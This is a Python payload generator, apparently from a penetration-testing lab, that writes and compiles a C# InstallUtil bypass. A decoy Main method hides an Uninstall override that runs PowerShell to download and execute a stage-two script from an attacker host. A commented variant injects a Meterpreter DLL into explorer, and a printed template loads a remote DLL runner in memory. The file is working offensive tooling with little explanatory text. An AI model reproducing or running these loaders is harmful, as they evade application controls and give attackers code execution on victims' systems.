#!/bin/env python3
from ak import *
import os
import subprocess

LHOST = "192.168.49.65"
LPORT = 443
BASE_FILENAME = 'win_installutil_ps_runner'

# Stage2 loader:
PS_CMD = f"(New-Object System.Net.WebClient).DownloadString('http://{LHOST}/run.txt') | IEX"
# PS_CMD = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.49.65/InvokeReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; InvokeReflectivePEInjection -PEBytes $bytes -ProcId $procid";

def generate():

  template = """
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
namespace Foonaria
{{
   class Program
   {{
       static void Main(string[] args)
       {{
	   Console.WriteLine("This is the main method which is a decoy");
       }}
   }}
   [System.ComponentModel.RunInstaller(true)]
   public class Sample : System.Configuration.Install.Installer
   {{
       public override void Uninstall(System.Collections.IDictionary savedState)
       {{
	   String cmd = "{PS_CMD}";

	   Runspace rs = RunspaceFactory.CreateRunspace();
	   rs.Open();
	   PowerShell ps = PowerShell.Create();
	   ps.Runspace = rs;
	   ps.AddScript(cmd);
	   ps.Invoke();
	   rs.Close();
       }}
   }} }}
""".format(PS_CMD=PS_CMD)

  print(template)
  f = open(BASE_FILENAME + '.cs', "w")
  f.write(template)
  f.close()

  print("-"*50)
  ps_template = """
  $data = (New-Object System.Net.WebClient).DownloadData('http://{LHOST}/DLL-Runner-x86.dll')
  $assem = [System.Reflection.Assembly]::Load($data) 
                                                                                                      
  $class = $assem.GetType('DLL_Runner.Class1')
  $method = $class.GetMethod("runner")
  $method.Invoke(0, $null)
  """.format(LHOST=LHOST)

  print("Use code like this for stage2: " + ps_template)

def compile():
  cmd = f"mcs /r:libraries/System.Management.Automation.dll,libraries/System.Configuration.Install.dll {BASE_FILENAME}.cs"
  os.system(cmd)

def main():
  generate()
  compile() 

  print("Wrote to: "+ BASE_FILENAME + ".cs")
  print("Compile DLL runner")

if __name__ == "__main__":
  main()
